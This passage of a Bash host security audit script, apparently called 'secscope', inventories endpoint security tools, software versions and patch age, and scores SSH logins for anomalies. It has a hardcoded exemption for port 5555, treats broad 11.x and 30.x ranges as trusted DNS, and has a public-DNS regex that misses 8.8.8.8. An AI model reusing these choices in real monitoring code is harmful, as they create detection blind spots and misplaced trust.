    [ $((ip_int / block)) -eq $((net_int / block)) ]
}

is_trusted_remote_ip() {
    local ip="$1" candidate
    ip="${ip#::ffff:}"
    for candidate in "${TRUSTED_REMOTE_IPS[@]}"; do
        candidate="${candidate#::ffff:}"
        if [[ "$candidate" == */* && "$ip" == *.* ]]; then
            ipv4_in_cidr "$ip" "$candidate" && return 0
        elif [ "$ip" = "$candidate" ]; then
            return 0
        fi
    done
    return 1
}

is_private_or_local_ip() {
    local ip="$1"
    ip="${ip#::ffff:}"
    [[ "$ip" =~ ^127\. ]] && return 0
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^169\.254\. ]] && return 0
    [[ "$ip" =~ ^(::1|fe80:|fc[0-9a-fA-F]{2}:|fd[0-9a-fA-F]{2}:) ]] && return 0
    return 1
}

endpoint_ip() {
    local endpoint="$1"
    if [[ "$endpoint" =~ ^\[([^]]+)\]:[0-9]+$ ]]; then
        printf '%s' "${BASH_REMATCH[1]}"
    else
        printf '%s' "${endpoint%:*}"
    fi
}

endpoint_port() {
    local endpoint="$1"
    printf '%s' "${endpoint##*:}"
}

is_common_port() {
    local wanted="$1" port
    for port in "${WHITELIST_PORTS[@]}"; do
        [ "$port" = "$wanted" ] && return 0
    done
    return 1
}

is_allowed_listener_port() {
    local wanted_port="$1" wanted_protocol="${2:-TCP}" rule spec protocol range start end
    # 仅对本机监听降噪；远端同端口外连仍检查。
    [ "$wanted_port" = "5555" ] && return 0
    wanted_protocol=$(printf '%s' "$wanted_protocol" | tr '[:lower:]' '[:upper:]')
    for rule in "${ALLOWED_PORT_RULES[@]}"; do
        spec=$(printf '%s' "$rule" | tr -d '[:space:]')
        protocol="ANY"; range="$spec"
        if [[ "$spec" == */* ]]; then protocol=$(printf '%s' "${spec%%/*}" | tr '[:lower:]' '[:upper:]'); range="${spec#*/}"; fi
        [ "$protocol" = "ANY" ] || [ "$protocol" = "$wanted_protocol" ] || continue
        if [[ "$range" == *-* ]]; then start="${range%-*}"; end="${range#*-}"; else start="$range"; end="$range"; fi
        [[ "$start" =~ ^[0-9]+$ && "$end" =~ ^[0-9]+$ ]] || continue
        [ "$wanted_port" -ge "$start" ] 2>/dev/null && [ "$wanted_port" -le "$end" ] && return 0
    done
    return 1
}

collect_local_addresses() {
    LOCAL_ADDRESSES=()
    local address existing seen
    while IFS= read -r address; do
        address="${address%%/*}"
        [ -n "$address" ] || continue
        is_private_or_local_ip "$address" && {
            case "$address" in 127.*|::1|169.254.*|fe80:*) continue ;; esac
        }
        seen=false
        for existing in "${LOCAL_ADDRESSES[@]}"; do [ "$existing" = "$address" ] && seen=true; done
        [ "$seen" = true ] || LOCAL_ADDRESSES+=("$address")
    done < <(ip -o addr show scope global 2>/dev/null | awk '{print $4}')
}

add_priority_recommendation() {
    local key="$1" item="$2" status="$3" recommendation="$4" idx
    for idx in "${!PRIORITY_KEYS[@]}"; do
        if [ "${PRIORITY_KEYS[$idx]}" = "$key" ]; then
            PRIORITY_ITEMS[$idx]="$item"; PRIORITY_STATUSES[$idx]="$status"; PRIORITY_RECOMMENDATIONS[$idx]="$recommendation"
            return 0
        fi
    done
    PRIORITY_KEYS+=("$key"); PRIORITY_ITEMS+=("$item"); PRIORITY_STATUSES+=("$status"); PRIORITY_RECOMMENDATIONS+=("$recommendation")
}

add_endpoint_product() {
    local name="$1" status="$2" detail="$3" source="$4" idx
    for idx in "${!ENDPOINT_NAMES[@]}"; do
        [ "${ENDPOINT_NAMES[$idx]}" = "$name" ] || continue
        ENDPOINT_STATUSES[$idx]="$status"; ENDPOINT_DETAILS[$idx]="$detail"; ENDPOINT_SOURCES[$idx]="$source"
        return 0
    done
    ENDPOINT_NAMES+=("$name"); ENDPOINT_STATUSES+=("$status"); ENDPOINT_DETAILS+=("$detail"); ENDPOINT_SOURCES+=("$source")
}

service_state_any() {
    local service state="未运行"
    command -v systemctl >/dev/null 2>&1 || { printf '未知'; return; }
    for service in "$@"; do
        if systemctl is-active --quiet "$service" 2>/dev/null; then printf '运行中'; return; fi
        systemctl list-unit-files "$service" 2>/dev/null | grep -q "^${service}" && state="已安装但未运行"
    done
    printf '%s' "$state"
}

collect_endpoint_security() {
    ENDPOINT_NAMES=(); ENDPOINT_STATUSES=(); ENDPOINT_DETAILS=(); ENDPOINT_SOURCES=()
    local state definitions="未获取" age_days="" now mtime
    if command -v clamscan >/dev/null 2>&1 || command -v clamd >/dev/null 2>&1 || \
       systemctl list-unit-files 'clamav-daemon.service' 'clamd.service' 2>/dev/null | grep -qE '^(clamav-daemon|clamd)'; then
        state=$(service_state_any clamav-daemon.service clamd.service clamd@scan.service)
        for definitions in /var/lib/clamav/daily.cvd /var/lib/clamav/daily.cld; do [ -f "$definitions" ] && break; done
        if [ -f "$definitions" ]; then
            now=$(date +%s); mtime=$(stat -c '%Y' "$definitions" 2>/dev/null || stat -f '%m' "$definitions" 2>/dev/null || echo "$now")
            age_days=$(((now - mtime) / 86400)); definitions="病毒库 ${age_days} 天前更新"
            [ "$age_days" -le 7 ] || add_priority_recommendation antivirus-clamav-definitions 'ClamAV 病毒库' "$definitions" '更新病毒库并检查 freshclam 服务及更新源'
        else
            definitions="病毒库状态未知"
        fi
        add_endpoint_product 'ClamAV' "$state" "$definitions" '程序与 systemd 服务'
        [ "$state" = '运行中' ] || add_priority_recommendation antivirus-clamav-service 'ClamAV 实时服务' "$state" '确认是否由其他 EDR 覆盖；需要实时扫描时启用 clamd'
    fi
    local spec name services
    while IFS='|' read -r name services; do
        command -v systemctl >/dev/null 2>&1 || continue
        systemctl list-unit-files "$services" 2>/dev/null | grep -q "^${services}" || continue
        state=$(service_state_any $services)
        add_endpoint_product "$name" "$state" '未提供统一病毒库接口' 'systemd 服务'
        [ "$state" = '运行中' ] || add_priority_recommendation "endpoint-${name}" "$name" "$state" '核查该终端安全组件是否应保持运行'
    done <<'PRODUCTS'
Wazuh Agent|wazuh-agent.service
Falco|falco.service
osquery|osqueryd.service
CrowdSec|crowdsec.service
auditd|auditd.service
PRODUCTS
    if [ "${#ENDPOINT_NAMES[@]}" -eq 0 ]; then
        add_priority_recommendation endpoint-inventory '终端安全软件' '未从本机服务识别' '确认是否由云安全、EDR 或宿主层防护覆盖'
    fi
    {
        local idx
        for idx in "${!ENDPOINT_NAMES[@]}"; do
            printf 'Product=%s; Status=%s; Detail=%s; Source=%s\n' "${ENDPOINT_NAMES[$idx]}" "${ENDPOINT_STATUSES[$idx]}" "${ENDPOINT_DETAILS[$idx]}" "${ENDPOINT_SOURCES[$idx]}"
        done
        [ "${#ENDPOINT_NAMES[@]}" -gt 0 ] || echo 'No local endpoint security product identified'
    } | dump_raw 'endpoint-security.txt'
}

add_component_inventory() {
    local name="$1" version="$2" source="$3" support="${4:-待确认（离线清单不判断厂商生命周期）}" idx
    [ -n "$version" ] || return 0
    for idx in "${!COMPONENT_NAMES[@]}"; do
        [ "${COMPONENT_NAMES[$idx]}" = "$name" ] || continue
        COMPONENT_VERSIONS[$idx]="$version"; COMPONENT_SOURCES[$idx]="$source"; COMPONENT_SUPPORT[$idx]="$support"; return 0
    done
    COMPONENT_NAMES+=("$name"); COMPONENT_VERSIONS+=("$version"); COMPONENT_SOURCES+=("$source"); COMPONENT_SUPPORT+=("$support")
}

collect_component_inventory() {
    COMPONENT_NAMES=(); COMPONENT_VERSIONS=(); COMPONENT_SOURCES=(); COMPONENT_SUPPORT=()
    local value path
    add_component_inventory Kernel "$(uname -r 2>/dev/null)" uname
    command -v ssh >/dev/null 2>&1 && add_component_inventory OpenSSH "$(ssh -V 2>&1 | head -1)" 'ssh -V'
    command -v openssl >/dev/null 2>&1 && add_component_inventory OpenSSL "$(openssl version 2>/dev/null | head -1)" 'openssl version'
    command -v nginx >/dev/null 2>&1 && add_component_inventory Nginx "$(nginx -v 2>&1 | head -1)" 'nginx -v'
    if command -v apache2 >/dev/null 2>&1; then add_component_inventory Apache "$(apache2 -v 2>/dev/null | head -1)" 'apache2 -v'
    elif command -v httpd >/dev/null 2>&1; then add_component_inventory Apache "$(httpd -v 2>/dev/null | head -1)" 'httpd -v'; fi
    command -v java >/dev/null 2>&1 && add_component_inventory Java "$(java -version 2>&1 | head -1)" 'java -version'
    command -v redis-server >/dev/null 2>&1 && add_component_inventory Redis "$(redis-server --version 2>/dev/null | head -1)" 'redis-server --version'
    command -v docker >/dev/null 2>&1 && add_component_inventory Docker "$(docker --version 2>/dev/null | head -1)" 'docker --version'
    for path in /usr/share/tomcat/bin/version.sh /opt/tomcat/bin/version.sh /usr/local/tomcat/bin/version.sh; do
        [ -x "$path" ] || continue
        value=$("$path" 2>/dev/null | grep -m1 '^Server version:')
        add_component_inventory Tomcat "$value" "$path"; break
    done
    {
        printf 'component\tversion\tsource\tsupport_status\n'
        local idx
        for idx in "${!COMPONENT_NAMES[@]}"; do printf '%s\t%s\t%s\t%s\n' "${COMPONENT_NAMES[$idx]}" "${COMPONENT_VERSIONS[$idx]}" "${COMPONENT_SOURCES[$idx]}" "${COMPONENT_SUPPORT[$idx]}"; done
    } | dump_raw 'component-inventory.tsv'
}

collect_patch_posture() {
    local latest="" epoch now
    case "$PKG_MGR" in
        dpkg) latest=$(awk '/ (install|upgrade) / {d=$1} END {print d}' /var/log/dpkg.log 2>/dev/null) ;;
        rpm) latest=$(rpm -qa --last 2>/dev/null | head -1 | sed -E 's/^[^[:space:]]+[[:space:]]+//') ;;
    esac
    if [ -n "$latest" ] && epoch=$(date -d "$latest" +%s 2>/dev/null); then
        now=$(date +%s); PATCH_LATEST="$latest"; PATCH_AGE_DAYS=$(((now - epoch) / 86400)); PATCH_STATUS="KNOWN"
        [ "$PATCH_AGE_DAYS" -le 90 ] || add_priority_recommendation patch-age '最近系统包更新' "${PATCH_AGE_DAYS} 天前" '核对发行版安全仓库、维护窗口和未安装安全更新'
    else
        PATCH_STATUS="UNKNOWN"; PATCH_LATEST=""; PATCH_AGE_DAYS=-1
        add_priority_recommendation patch-visibility '系统补丁时效' '无法从本机离线数据可靠确认' '结合发行版生命周期和补丁平台人工核验；未知不等同未打补丁'
    fi
    printf 'status=%s\nlatest=%s\nage_days=%s\nsource=%s\n' "$PATCH_STATUS" "$PATCH_LATEST" "$PATCH_AGE_DAYS" "$PKG_MGR" | dump_raw 'patch-posture.txt'
}

severity_label() {
    case "$1" in CRITICAL) echo '严重' ;; HIGH) echo '高危' ;; MEDIUM) echo '中危' ;; LOW) echo '低危' ;; OBSERVE) echo '观察' ;; *) echo "$1" ;; esac
}

finding_type_label() {
    case "$1" in
        SECURITY_THREAT) echo '已确认或高置信安全威胁' ;;
        SECURITY_ANOMALY) echo '待研判安全异常' ;;
        CONFIG_BASELINE) echo '配置基线风险' ;;
        SOFTWARE_TRUST_GAP) echo '软件信任缺口' ;;
        RUNTIME_OBSERVATION) echo '运行 / 性能观察' ;;
        *) echo "$1" ;;
    esac
}

confidence_label() {
    case "$1" in HIGH) echo '高' ;; MEDIUM) echo '中' ;; LOW) echo '低' ;; *) echo "$1" ;; esac
}

lifecycle_label() {
    case "$1" in
        NEW) echo '新增' ;; ONGOING) echo '持续存在' ;; CHANGED) echo '已变化' ;; ESCALATED) echo '风险升级' ;;
        DEESCALATED) echo '风险降低' ;; RESOLVED) echo '已恢复' ;; REOPENED) echo '再次出现' ;;
        BASELINE_EXISTING) echo '基线已有' ;; UNTRACKED) echo '未跟踪' ;; *) echo "$1" ;;
    esac
}

module_status_label() {
    case "$1" in SUCCESS) echo '完成' ;; PARTIAL) echo '部分完成' ;; FAILED) echo '失败' ;; *) echo "$1" ;; esac
}

state_health_label() {
    case "$1" in
        OK|HEALTHY) echo '正常' ;; UPGRADED) echo '已兼容升级' ;; NEW|INITIALIZED) echo '已初始化' ;; RESET|STATE_RESET) echo '已重建' ;;
        RECOVERED_BACKUP) echo '已从备份恢复' ;; DISABLED) echo '已禁用' ;; FAILED) echo '异常' ;; UNINITIALIZED) echo '未初始化' ;; *) echo "$1" ;;
    esac
}

host_role_label() {
    case "$1" in
        kubernetes|kubernetes-control-plane|kubernetes-node|container-host) echo 'Kubernetes / 容器主机' ;;
        database|database-server) echo '数据库服务器' ;; web|web-server) echo 'Web 服务器' ;;
        bastion) echo '堡垒机' ;; dev) echo '开发 / 构建服务器' ;; generic|generic-server) echo '通用服务器' ;; *) echo "$1" ;;
    esac
}

sorted_finding_indices() {
    local idx rank
    for idx in "${!FINDINGS[@]}"; do
        rank=$(severity_rank "${FINDING_SEVS[$idx]}")
        printf '%d\t%s\t%s\t%d\n' "$((5 - rank))" "${FINDING_CATS[$idx]}" "${FINDING_FINGERPRINTS[$idx]}" "$idx"
    done | LC_ALL=C sort -t $'\t' -k1,1n -k2,2 -k3,3 | awk -F'\t' '{print $4}'
}

parse_ssh_success_events() {
    printf '%s\n' "$AUTH_EVENTS" | grep -E 'sshd.*Accepted[[:space:]]+' | tail -n "$AUTH_MAX_EVENTS" | awk '
        {
            method=""; user=""; ip=""; hour=-1
            for (i=1; i<=NF; i++) {
                if ($i=="Accepted" && i<NF) method=$(i+1)
                if ($i=="for" && i<NF) {
                    if ($(i+1)=="invalid" && i+2<=NF) user=$(i+2); else user=$(i+1)
                }
                if ($i=="from" && i<NF) ip=$(i+1)
            }
            if (match($1, /T[0-9][0-9]:/)) hour=substr($1, RSTART+1, 2)+0
            else if ($3 ~ /^[0-9][0-9]:[0-9][0-9]:[0-9][0-9]/) hour=substr($3,1,2)+0
            gsub(/[^A-Za-z0-9._-]/, "", user)
            gsub(/[^A-Za-z0-9._\/:+-]/, "", ip)
            gsub(/[^A-Za-z0-9._\/-]/, "", method)
            if (user!="" && ip!="" && method!="") print method "|" user "|" ip "|" hour "|" $0
        }'
}

auth_profile_header() {
    printf '#secscope-auth-v1|%s' "$HOST_ID"
}

prepare_auth_profile_store() {
    if [ "$AUTH_BEHAVIOR_ENABLED" != "true" ]; then AUTH_PROFILE_HEALTH="DISABLED"; return 0; fi
    if [ "$STATE_ENABLED" != "true" ]; then AUTH_PROFILE_HEALTH="UNTRACKED"; return 0; fi
    AUTH_PROFILE_FILE="${STATE_DIR}/auth_profiles.state"
    AUTH_SEEN_FILE="${STATE_DIR}/auth_events.seen"
    local expected="#secscope-auth-v1|${HOST_ID}"
    if [ -s "$AUTH_PROFILE_FILE" ] && [ "$(head -1 "$AUTH_PROFILE_FILE")" != "$expected" ]; then
        if [ -s "${AUTH_PROFILE_FILE}.bak" ] && [ "$(head -1 "${AUTH_PROFILE_FILE}.bak")" = "$expected" ]; then
            cp "${AUTH_PROFILE_FILE}.bak" "$AUTH_PROFILE_FILE"
            AUTH_PROFILE_HEALTH="RECOVERED_BACKUP"
        else
            mv "$AUTH_PROFILE_FILE" "${STATE_DIR}/auth_profiles.state.corrupt_${TIMESTAMP}"
            AUTH_PROFILE_HEALTH="RESET"
        fi
    fi
    if [ ! -s "$AUTH_PROFILE_FILE" ]; then
        auth_profile_header > "$AUTH_PROFILE_FILE" || return 1
        printf '\n' >> "$AUTH_PROFILE_FILE"
        [ "$AUTH_PROFILE_HEALTH" = "RESET" ] || AUTH_PROFILE_HEALTH="INITIALIZED"
    elif [ "$AUTH_PROFILE_HEALTH" != "RECOVERED_BACKUP" ]; then
        AUTH_PROFILE_HEALTH="OK"
    fi
    touch "$AUTH_SEEN_FILE" || return 1
    chmod 600 "$AUTH_PROFILE_FILE" "$AUTH_SEEN_FILE"
}

auth_profile_user_seen() {
    [ -s "$AUTH_PROFILE_FILE" ] && awk -F'|' -v user="$1" '$2==user {found=1; exit} END {exit !found}' "$AUTH_PROFILE_FILE"
}

auth_profile_ip_seen() {
    [ -s "$AUTH_PROFILE_FILE" ] && awk -F'|' -v user="$1" -v ip="$2" '$2==user && $3==ip {found=1; exit} END {exit !found}' "$AUTH_PROFILE_FILE"
}

auth_profile_method_seen() {
    [ -s "$AUTH_PROFILE_FILE" ] && awk -F'|' -v user="$1" -v method="$2" '$2==user && $4==method {found=1; exit} END {exit !found}' "$AUTH_PROFILE_FILE"
}

update_auth_profile() {
    [ "$STATE_ENABLED" = "true" ] && [ "$AUTH_BEHAVIOR_ENABLED" = "true" ] || return 0
    local key="$1" user="$2" ip="$3" method="$4" next
    next=$(mktemp "${STATE_DIR}/.auth.next.XXXXXX") || return 1
    awk -F'|' -v OFS='|' -v key="$key" -v user="$user" -v ip="$ip" -v method="$method" \
        -v now="$RUN_STARTED_AT" '
        $1==key {$6=now; $7=$7+1; found=1}
        {print}
        END {if (!found) print key,user,ip,method,now,now,1}
    ' "$AUTH_PROFILE_FILE" > "$next" || { rm -f "$next"; return 1; }
    chmod 600 "$next"
    cp "$AUTH_PROFILE_FILE" "${AUTH_PROFILE_FILE}.bak" 2>/dev/null || true
    mv "$next" "$AUTH_PROFILE_FILE"
    chmod 600 "${AUTH_PROFILE_FILE}.bak" 2>/dev/null || true
}

compact_auth_seen_events() {
    [ "$STATE_ENABLED" = "true" ] && [ -f "$AUTH_SEEN_FILE" ] || return 0
    local next
    next=$(mktemp "${STATE_DIR}/.auth.seen.XXXXXX") || return 1
    tail -n 5000 "$AUTH_SEEN_FILE" > "$next"
    chmod 600 "$next"
    mv "$next" "$AUTH_SEEN_FILE"
}

analyze_ssh_auth_behavior() {
    [ "$AUTH_BEHAVIOR_ENABLED" = "true" ] || { AUTH_PROFILE_HEALTH="DISABLED"; return 0; }
    local events method user ip hour raw event_hash tuple_key score severity reasons uid
    local user_seen=false ip_seen=false method_seen=false tuple_seen=false run_pairs=""
    prepare_auth_profile_store || {
        AUTH_PROFILE_HEALTH="FAILED"
        mark_current_module_partial "auth_profile_store_failed"
        log_warn "认证行为画像状态不可用"
    }
    events=$(parse_ssh_success_events)
    [ -n "$events" ] || return 0
    printf '%s\n' "$events" | dump_raw "ssh_success_events.txt"

    while IFS='|' read -r method user ip hour raw; do
        [ -n "$user" ] && [ -n "$ip" ] || continue
        [[ "$ip" =~ ^127\. || "$ip" = "::1" ]] && continue
        event_hash=$(sha256_text "${method}|${user}|${ip}|${hour}|${raw}")
        if [ "$STATE_ENABLED" = "true" ] && [ -f "$AUTH_SEEN_FILE" ] && grep -q "^${event_hash}|" "$AUTH_SEEN_FILE" 2>/dev/null; then
            continue
        fi
        tuple_key=$(sha256_text "${user}|${ip}|${method}")
        tuple_seen=false
        if [ "$STATE_ENABLED" = "true" ] && grep -q "^${tuple_key}|" "$AUTH_PROFILE_FILE" 2>/dev/null; then tuple_seen=true; fi

        score=0; reasons=""
        user_seen=false; ip_seen=false; method_seen=false
        auth_profile_user_seen "$user" && user_seen=true
        auth_profile_ip_seen "$user" "$ip" && ip_seen=true
        auth_profile_method_seen "$user" "$method" && method_seen=true
        if [ "$tuple_seen" = false ] && [ "$user_seen" = true ]; then
            if [ "$ip_seen" = false ]; then score=$((score + 4)); reasons="${reasons}账号首次从该来源登录; "; fi
            if [ "$method_seen" = false ]; then score=$((score + 2)); reasons="${reasons}认证方式发生变化; "; fi
        elif [ "$tuple_seen" = false ]; then
            score=$((score + 1)); reasons="${reasons}账号首次进入认证画像; "
        fi
        case "$method" in
            password|keyboard-interactive*|challenge-response*)
                if [ "$tuple_seen" = false ]; then
                    score=$((score + 1)); reasons="${reasons}使用口令类认证; "
                fi
                ;;
        esac
        if [ "$user" = "root" ]; then score=$((score + 3)); reasons="${reasons}root 直接登录; "; fi
        uid=$(awk -F: -v user="$user" '$1==user {print $3; exit}' /etc/passwd 2>/dev/null)
        if [[ "$uid" =~ ^[0-9]+$ ]] && [ "$uid" -gt 0 ] && [ "$uid" -lt 1000 ]; then
            score=$((score + 4)); reasons="${reasons}系统服务账号交互登录; "
        fi
        if [[ "$hour" =~ ^[0-9]+$ ]] && [ "$hour" -ge 0 ] && [ "$hour" -le 5 ]; then
            score=$((score + 3)); reasons="${reasons}非工作时段登录; "
        fi
        if ! is_private_or_local_ip "$ip" && ! is_trusted_remote_ip "$ip"; then
            if [ "$tuple_seen" = false ]; then
                # “新来源 IP”和“首次外部来源”是同一信号族，不能重复累计。
                # 已有账号的新 IP 已在上面计 4 分；首次进入画像的账号在这里补 3 分。
                if [ "$user_seen" = false ]; then score=$((score + 3)); fi
                reasons="${reasons}首次出现的外部且未信任来源（来源新颖性不重复加分）; "
            else
                reasons="${reasons}外部来源已存在于历史画像（不重复加分）; "
            fi
        fi
        if printf '%s' "$run_pairs" | awk -F'|' -v user="$user" -v ip="$ip" '$1==user && $2!=ip {found=1} END {exit !found}'; then
            reasons="${reasons}同轮出现多个非回环来源（辅助信号，不单独加分）; "
        fi

        # 首轮未知元组只建模；仅当外部来源、特权账号、非工作时段等独立风险使评分达到阈值时告警。
        if [ "$INIT_STATE" != "true" ] && [ "$score" -ge 3 ]; then
            if [ "$score" -ge 8 ]; then severity="HIGH"
            elif [ "$score" -ge 3 ]; then severity="MEDIUM"
            else severity="LOW"
            fi
            emit_find "$severity" "账号认证行为异常: ${user} from ${ip}" \
                "方式=${method}; 小时=${hour}; 风险分=${score}; 原因=${reasons}" \
                "核实来源、账号使用人和登录后的命令/文件/网络行为；不确认时立即吊销凭据"
            record_find "$severity" "authentication" "账号认证行为异常: ${user} from ${ip}" \
                "方式=${method}; 小时=${hour}; 风险分=${score}; 原因=${reasons}; 日志=${raw}" \
                "核实登录并检查后续行为，必要时重置凭据和隔离会话" "T1078" "AUTH-UEBA-001" "${user}|${ip}|${method}" \
                "ssh_success_events.txt,auth_log_excerpt.txt,last_logins.txt,audit_auth_exec_events.txt" \
                "SECURITY_ANOMALY" "$([ "$severity" = HIGH ] && printf MEDIUM || printf LOW)" \
                '认证成功事件真实存在，但新来源、外部地址和口令认证不足以单独证明账号失陷' \
                '若同一会话随后出现提权、下载执行、敏感文件修改、持久化或异常外连，应升级为安全威胁'
        fi
        if [ "$STATE_ENABLED" = "true" ] && [ "$AUTH_PROFILE_HEALTH" != "FAILED" ]; then
            update_auth_profile "$tuple_key" "$user" "$ip" "$method" || AUTH_PROFILE_HEALTH="FAILED"
            printf '%s|%s\n' "$event_hash" "$RUN_STARTED_AT" >> "$AUTH_SEEN_FILE"
        fi
        run_pairs="${run_pairs}${user}|${ip}"$'\n'
    done <<< "$events"
    compact_auth_seen_events || AUTH_PROFILE_HEALTH="FAILED"
    [ "$AUTH_PROFILE_HEALTH" != "FAILED" ] || mark_current_module_partial "auth_profile_store_failed"
}

# 检查是否为可信内部 DNS（企业内网 DNS / 云 DNS）
is_trusted_dns() {
    local ns="$1"
    # RFC 1918 内网 + 链路本地
    [[ "$ns" =~ ^127\. ]] && return 0
    [[ "$ns" =~ ^::1$ ]] && return 0
    [[ "$ns" =~ ^10\. ]] && return 0
    [[ "$ns" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
    [[ "$ns" =~ ^192\.168\. ]] && return 0
    [[ "$ns" =~ ^169\.254\. ]] && return 0
    # 常见的公共 DNS
    [[ "$ns" =~ ^8\.8\.(8|4)\.4$ ]] && return 0
    [[ "$ns" =~ ^1\.1\.1\.[1-3]$ ]] && return 0
    [[ "$ns" =~ ^208\.67\.(220\.220|222\.222)$ ]] && return 0
    # 阿里云内网 DNS
    [[ "$ns" =~ ^100\.100\. ]] && return 0
    # 腾讯云内网 DNS
    [[ "$ns" =~ ^183\.60\.(82|83)\. ]] && return 0
    # 11.x 网段（企业内部/DoD 常用）
    [[ "$ns" =~ ^11\. ]] && return 0
    # 30.x 网段（某些企业内网）
    [[ "$ns" =~ ^30\. ]] && return 0
    return 1
}

# JSON 字符串序列化。普通字段走 Bash 快路径；特殊字符仍交给 Python 严格转义。
json_quote() {
    local value="$1"
    value=${value//\\/\\\\}
    value=${value//\"/\\\"}
    value=${value//$'\b'/\\b}
    value=${value//$'\f'/\\f}
    value=${value//$'\n'/\\n}
    value=${value//$'\r'/\\r}
    value=${value//$'\t'/\\t}
    value=${value//[$'\001'-$'\007'$'\013'$'\016'-$'\037'$'\177']/}
    printf '"%s"' "$value"
}

native_scanner_preflight() {
    local status_file="${RAW_DIR}/native-scanner-status.json" capability rc=0
    NATIVE_HASH_FILES_READY=false
    NATIVE_FILE_MONITOR_READY=false
    NATIVE_RUNTIME_READY=false
    case "$NATIVE_SCANNER_MODE" in auto|on|off) ;; *) log_error 'SECSCOPE_NATIVE_SCANNER 仅支持 auto、on 或 off'; return 2 ;; esac
    if [ "$NATIVE_SCANNER_MODE" = off ]; then
        NATIVE_SCANNER_STATUS="DISABLED"
    elif [ ! -f "$NATIVE_SCANNER_PATH" ] || [ -L "$NATIVE_SCANNER_PATH" ] || [ ! -x "$NATIVE_SCANNER_PATH" ]; then
        NATIVE_SCANNER_STATUS="UNAVAILABLE"
        BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
        [ "$NATIVE_SCANNER_MODE" = on ] && { log_error "native scanner 不可用: $NATIVE_SCANNER_PATH"; return 1; }
    else
        capability=$("$NATIVE_SCANNER_PATH" capabilities 2>/dev/null) || rc=$?
        if [ "$rc" -ne 0 ] ||
            ! printf '%s' "$capability" | grep -Eq '"protocol_version"[[:space:]]*:[[:space:]]*2' ||
            ! printf '%s' "$capability" | grep -Eq 'native_candidate_discovery' ||
            ! printf '%s' "$capability" | grep -Eq 'native_web_access_parser' ||
            ! printf '%s' "$capability" | grep -Eq 'native_static_analyzer' ||
            ! printf '%s' "$capability" | grep -Eq 'native_binary_analyzer' ||
            ! printf '%s' "$capability" | grep -Eq 'native_hash_files' ||
            ! printf '%s' "$capability" | grep -Eq 'native_file_monitor' ||
            ! printf '%s' "$capability" | grep -Eq "\\\"hash_analyzer_version\\\"[[:space:]]*:[[:space:]]*\\\"${NATIVE_HASH_ANALYZER_VERSION}\\\"" ||
            ! printf '%s' "$capability" | grep -Eq 'native_runtime_collector' ||
            ! printf '%s' "$capability" | grep -Eq 'native_filesystem_facts' ||
            ! printf '%s' "$capability" | grep -Eq 'native_events_parser'; then
            NATIVE_SCANNER_STATUS="INCOMPATIBLE"
            BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
            [ "$NATIVE_SCANNER_MODE" = on ] && { log_error 'native scanner 协议或 capabilities 校验失败'; return 1; }
        elif ! "$NATIVE_SCANNER_PATH" self-test >/dev/null 2>&1; then
            NATIVE_SCANNER_STATUS="SELF_TEST_FAILED"
            BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
            [ "$NATIVE_SCANNER_MODE" = on ] && { log_error 'native scanner self-test 失败'; return 1; }
        else
            NATIVE_SCANNER_STATUS="READY_NATIVE"
            NATIVE_HASH_FILES_READY=true
            NATIVE_FILE_MONITOR_READY=true
            NATIVE_RUNTIME_READY=true
        fi
    fi
    printf '{"schema_version":1,"mode":%s,"status":%s,"path":%s,"engine":"native-required","file_monitor_ready":%s,"runtime_collector_ready":%s}\n' \
        "$(json_quote "$NATIVE_SCANNER_MODE")" "$(json_quote "$NATIVE_SCANNER_STATUS")" "$(json_quote "$NATIVE_SCANNER_PATH")" "$NATIVE_FILE_MONITOR_READY" "$NATIVE_RUNTIME_READY" > "$status_file"
    chmod 600 "$status_file" 2>/dev/null || true
    record_raw_status 'native-scanner-status.json' SUCCESS bootstrap "status=${NATIVE_SCANNER_STATUS}"
    return 0
}

native_runtime_run() {
    local phase="$1" raw_path="$2" process_path="${3:-}" container_path="${4:-}" memory_path="${5:-}" socket_text_path="${6:-}" socket_tsv_path="${7:-}"
    local summary="${RAW_DIR}/runtime-snapshot-${phase}-summary.json" rc=0 status="FAILED"
    local -a command=("$NATIVE_SCANNER_PATH" runtime-snapshot --output "$raw_path" --phase "$phase"
        --max-processes 32768 --max-sockets 262144 --max-maps 262144)
    [ -n "$process_path" ] && command+=(--process-tsv "$process_path")
    [ -n "$container_path" ] && command+=(--container-tsv "$container_path")
    [ -n "$memory_path" ] && command+=(--memory-tsv "$memory_path")
    [ -n "$socket_text_path" ] && command+=(--socket-text "$socket_text_path")
    [ -n "$socket_tsv_path" ] && command+=(--socket-tsv "$socket_tsv_path")
    NATIVE_RUNTIME_LAST_STATUS="FAILED"
    NATIVE_RUNTIME_LAST_SUMMARY="$summary"
    [ "$NATIVE_RUNTIME_READY" = true ] || return 125
    run_with_timeout "$NATIVE_RUNTIME_TIMEOUT" "${command[@]}" > "$summary" 2>&1 || rc=$?
    chmod 600 "$summary" "$raw_path" "$process_path" "$container_path" "$memory_path" "$socket_text_path" "$socket_tsv_path" 2>/dev/null || true
    if [ "$rc" -eq 0 ] && grep -Eq '"status"[[:space:]]*:[[:space:]]*"(SUCCESS|PARTIAL)"' "$summary"; then
        if grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary"; then status=PARTIAL; else status=SUCCESS; fi
        [ -s "$raw_path" ] || status=FAILED
        [ -z "$process_path" ] || [ -f "$process_path" ] || status=FAILED
        [ -z "$container_path" ] || [ -f "$container_path" ] || status=FAILED
        [ -z "$memory_path" ] || [ -f "$memory_path" ] || status=FAILED
        [ -z "$socket_text_path" ] || [ -f "$socket_text_path" ] || status=FAILED
        [ -z "$socket_tsv_path" ] || [ -f "$socket_tsv_path" ] || status=FAILED
    fi
    NATIVE_RUNTIME_LAST_STATUS="$status"
    case "$phase" in
        initial) NATIVE_RUNTIME_INITIAL_STATUS="$status" ;;
        periodic) NATIVE_RUNTIME_PERIODIC_STATUS="$status" ;;
        final) NATIVE_RUNTIME_FINAL_STATUS="$status" ;;
    esac
    [ "$status" = SUCCESS ] || [ "$status" = PARTIAL ]
}

native_runtime_record_status() {
    local phase="$1" status="$2" source="${3:-process}" detail="${4:-}"
